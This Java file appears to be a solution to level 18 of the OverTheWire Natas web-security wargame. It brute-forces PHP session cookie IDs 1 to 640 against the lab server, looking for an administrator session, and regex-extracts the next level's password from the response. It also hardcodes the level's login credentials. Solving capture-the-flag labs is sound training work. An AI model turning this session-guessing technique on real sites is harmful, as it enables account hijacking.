package net.leirahjelle.playground;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.*;
import org.apache.http.impl.cookie.BasicClientCookie;

import java.io.IOException;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.IntStream;

public class Natas18 extends NatasLevel {

    public Natas18() {
        super(4);
    }

    public Natas18(int threads) {
        super(threads);
    }

    @Override
    public String findPassword() throws InterruptedException, ExecutionException {
        int[] potentialSessionIds = IntStream.rangeClosed(1,640).toArray();
//        System.out.println("Looping characters: "+allCharacters);


        List<NatasTask> tasks = new LinkedList<>();
        for (int sessionId : potentialSessionIds) {
            tasks.add(createTask(sessionId));
        }

        String password = runTasks(tasks);

        executor.shutdown();
        System.out.println("\nCompleted!");
        return password;
    }

    protected NatasTask createTask(int sessionId) {
        try {
//        System.out.println("Testing: "+charToTest);
            CredentialsProvider provider = new BasicCredentialsProvider();
            provider.setCredentials(AuthScope.ANY, new UsernamePasswordCredentials("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"));
            CloseableHttpClient httpClient = HttpClientBuilder.create()
                    .setDefaultCredentialsProvider(provider)
                    .build();

            URIBuilder builder = new URIBuilder("http://natas18.natas.labs.overthewire.org/index.php");
            builder.addParameter("debug", "true");
            builder.addParameter("username", "admin");
            builder.addParameter("password", "foo");

            String uri = builder.build().toASCIIString();
//        System.out.println("Testing uri: "+uri);
//        System.out.println("Testing param: "+builder.getQueryParams());
            HttpGet request = new HttpGet(uri);
            request.setHeader("Cookie", "PHPSESSID="+String.valueOf(sessionId));

            return new NatasTask(httpClient, request, (HttpResponse response, long requestTime) -> {
                System.out.println("Checking sessionId: "+request.getFirstHeader("Cookie").getValue());
                BasicResponseHandler responseHandler = new BasicResponseHandler();
                try {
                    String body = responseHandler.handleResponse(response);
                    if(body.contains("next level")) {
//                        System.out.println("BODY:\n"+body);
                        Pattern pattern = Pattern.compile("Password:\\s([^<]+)");
                        Matcher matcher = pattern.matcher(body);
                        while(matcher.find()) {
                            return matcher.group(1);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return "";
            });
        } catch (Exception exception) {
            throw new RuntimeException("Failed to create task", exception);
        }
    }
}
